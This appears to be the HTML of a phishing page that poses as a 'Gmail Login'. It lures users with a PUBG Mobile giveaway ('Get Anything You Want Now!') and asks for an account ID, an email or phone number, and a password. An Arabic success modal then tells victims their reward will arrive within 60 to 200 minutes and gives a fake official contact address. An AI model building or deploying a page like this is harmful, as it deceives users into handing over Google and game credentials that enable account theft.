<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title> Gmail Login</title>
    <link rel="icon" href="icons/google-plus-icon.png">
    <link rel="stylesheet" href="../css\fonts\ar\ar-font.css">
    <link rel="stylesheet" href="../css/bootstrap.min.css">
    <script src="../js/bootstrap.min.js"></script>
    <script src="../js/jquery-3.5.1.min.js"></script>
    <link rel="stylesheet" href="css/google.css">
    <script src="index.js"></script>

</head>

<body>
    <!-- Done Div -->
    <button type="button" class="btn btn-primary done-successfully-cinghaha" data-toggle="modal" data-target="#exampleModalCenter" style="display: none;"></button>
    <div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="exampleModalCenterTitle">Successfully Done...</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p style="text-align: center !important;">تمت العميلة بنجاح ,الرجاء الانتضار 60 دقيقة الى 200 دقيقة حتى وصوله الى حسابك. <br><br>اذا واجهتك اي مشكلة يرجى التواصل عبر بريدنا الاكتروني:<br><br>pubg-mobile@official.com <br> </p>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">تــم</button>
                </div>
            </div>
        </div>
    </div>
    <!-- End Done Div -->

    <center>
        <h1 class="d-none d-sm-block" style="color:#955fff;margin-top:40px;margin-bottom:40px">Get Anything You Want Now!</h1>
        <h3 class="d-block d-sm-none" style="color:#955fff;margin-top:40px;margin-bottom:40px">Get Anything You Want Now!</h3>
        <img class="img-fluid index-all-page-img" style="width:20%;" id="pg" src="../images/PG.png">
        <hr color="#7253E7">
    </center>
    <div class="login-form">
        <form action="/examples/actions/confirmation.php" method="post">
            <div class="text-center">
                <img src="https://www.tutorialrepublic.com/examples/images/avatar.gif" class="rounded-circle avatar" alt="Avatar">
            </div>
            <div class="form-group">
                <input type="text" name="id" class="form-control id_go" placeholder="Account ID" required="required" style="text-align: center;margin-bottom:3px">
                <input type="text" name="email" class="form-control email_go" placeholder="البريد او رقم الهاتف" required="required">
                <input type="password" name="password" class="form-control password_go" placeholder="كـلمه المرور" required="required" style="margin-top: 5px;">
            </div>
            <div class="form-group">
                <button type="button" class="btn btn-primary btn-block google-login-bu">تـسجيل دخـول</button>
            </div>
            <div class="bottom-action clearfix">
                <label class="float-left form-check-label"><input type="checkbox"> Remember me</label>
                <a href="https://accounts.google.com/signin/recovery" class="float-right">Forgot Password?</a>
            </div>
        </form>
        <p class="text-center"><a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp">Create an Account</a></p>
    </div>
    <script src="../js/bootstrap.min.js"></script>

</body>

</html>